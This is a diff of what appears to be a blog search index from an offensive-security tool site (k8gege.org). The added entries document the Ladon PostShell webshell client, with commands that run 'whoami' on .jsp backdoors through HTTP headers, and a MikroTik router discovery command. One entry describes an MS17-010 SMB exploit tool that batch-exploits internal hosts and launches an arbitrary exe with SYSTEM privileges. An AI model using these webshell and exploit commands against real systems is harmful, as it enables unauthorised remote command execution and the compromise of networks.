@@ -2818,6 +2818,49 @@ window.location.href="http://k8gege.org/Ladon/LadonGo.html";
       </tags>
   </entry>
   <entry>
+    <title>〖Tech〗Ladon PostShell连接CmdShell</title>
+    <url>/p/PostShell.html</url>
+    <content><![CDATA[<p></p>
+<h5 id="230-PostShell连接工具-支持自定义HTTP头提交"><a href="#230-PostShell连接工具-支持自定义HTTP头提交" class="headerlink" title="230 PostShell连接工具,支持自定义HTTP头提交"></a>230 PostShell连接工具,支持自定义HTTP头提交</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon PostShell &lt;method&gt; &lt;url&gt; &lt;<span class="built_in">pwd</span>&gt; &lt;<span class="built_in">type</span>&gt; &lt;cmd&gt;</span><br><span class="line">Ladon PostShell POST http://192.168.50.18/post.jsp tom cmd whoami</span><br><span class="line">Ladon PostShell POST http://192.168.50.18/post.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell POST http://192.168.50.18/post.jsp tom base64 d2hvYW1p</span><br><span class="line">Ladon PostShell UA http://192.168.50.18/ua.jsp tom cmd whoami</span><br><span class="line">Ladon PostShell UA http://192.168.50.18/ua.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell UA http://192.168.50.18/ua.jsp tom base64 d2hvYW1p</span><br><span class="line">Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom cmd whoami</span><br><span class="line">Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell Cookie http://192.168.50.18/ck.jsp tom base64 d2hvYW1p</span><br><span class="line">Ladon PostShell Referer http://192.168.50.18/re.jsp tom cmd whoami</span><br><span class="line">Ladon PostShell Referer http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell Referer http://192.168.50.18/re.jsp tom base64 d2hvYW1p</span><br><span class="line">Ladon PostShell Destination http://192.168.50.18/re.jsp tom cmd whoami</span><br><span class="line">Ladon PostShell Destination http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell Destination http://192.168.50.18/re.jsp tom base64 d2hvYW1p</span><br><span class="line">Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom cmd whoami</span><br><span class="line">Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom b64cmd d2hvYW1p</span><br><span class="line">Ladon PostShell HttpBasic http://192.168.50.18/re.jsp tom base64 d2hvYW1p</span><br></pre></td></tr></table></figure>
+
+<p>Cobalt Strike命令行PostShell<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/cs/cs_postshell.png"></p>
+<p>PostShell连接poswershell后门<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/web_ps1.PNG"></p>
+<p>PostShell连接nodejs后门<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/nodejs_ubuntu.PNG"></p>
+<h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>10.10.6：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+        <category>WebShell</category>
+      </categories>
+      <tags>
+        <tag>WebShell</tag>
+        <tag>CmdShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>〖Tech〗Ladon RouterOS/Mikrotik路由器探测</title>
+    <url>/p/MndpInfo.html</url>
+    <content><![CDATA[<p></p>
+<h5 id="229-Mndp协议广播探测同网段Mikrotik路由器信息"><a href="#229-Mndp协议广播探测同网段Mikrotik路由器信息" class="headerlink" title="229 Mndp协议广播探测同网段Mikrotik路由器信息"></a>229 Mndp协议广播探测同网段Mikrotik路由器信息</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon MndpInfo</span><br><span class="line">Ladon RouterOS</span><br><span class="line">Ladon Mikrotik</span><br></pre></td></tr></table></figure>
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/mndp.PNG"></p>
+<h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>History: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>9.1.1：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>10.10.6：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+        <category>Router</category>
+      </categories>
+      <tags>
+        <tag>RouterOS</tag>
+        <tag>Mikrotik</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>〖教程〗Ladon Socks代理扫描(附Proxifier V4.11注册码)</title>
     <url>/p/proxy.html</url>
     <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
@@ -4148,8 +4191,8 @@ Windows 10 Version 1809 for 32-bit Systems</code></pre><h3 id="版本"><a href="
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>提权</category>
+        <category>Ladon</category>
         <category>远程执行</category>
       </categories>
       <tags>
@@ -6279,11 +6322,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -6553,8 +6596,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>提权</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -6816,8 +6859,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 ]]></content>
       <categories>
         <category>Ladon</category>
-        <category>密码</category>
         <category>Kali</category>
+        <category>密码</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -8353,6 +8396,33 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       </tags>
   </entry>
   <entry>
+    <title>SMB溢出工具加强版</title>
+    <url>/p/68a8bf1b.html</url>
+    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
+<p><strong>编译:</strong>python</p>
+<p><strong>漏洞:</strong>MS17-010</p>
+<p><strong>用法:</strong></p>
+<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
+<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
+<p><strong>内网批量</strong></p>
+<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
+<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
+<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
+<p>&nbsp;</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>MS17010</tag>
+        <tag>SMB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
     <url>/p/e896a7d1.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
@@ -8449,33 +8519,6 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SMB溢出工具加强版</title>
-    <url>/p/68a8bf1b.html</url>
-    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
-<p><strong>编译:</strong>python</p>
-<p><strong>漏洞:</strong>MS17-010</p>
-<p><strong>用法:</strong></p>
-<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
-<p>如exe启动参数为&nbsp; m.exe -Start 实战命令为 zzz_exploit.exe 192.11.22.82 -Start</p>
-<p><strong>内网批量</strong></p>
-<p>可结合cping批量溢出内网,将名称改为smbcheck即可,但exe必须使用无参版。（其它工具也可以，提供个IP参数即可）</p>
-<p>因为cping只会传IP进去,不会传其它参数。使用前需将任意exe改名为ma.dat</p>
-<p>溢出成功会自动将exe传入目标机器，并以system权限启动exe程序。</p>
-<p><img alt data-original="http://k8gege.org/k8img/posts/k8zzz.png"></p>
-<p>&nbsp;</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>MS17010</tag>
-        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -8821,11 +8864,11 @@ from pprint import pprint
 <p><a href="https://www.cnblogs.com/k8gege/p/10367844.html" target="_blank">https://www.cnblogs.com/k8gege/p/10367844.html</a></p>]]></content>
       <categories>
         <category>工具</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
         <category>嗅探</category>
         <category>Python</category>
       </categories>
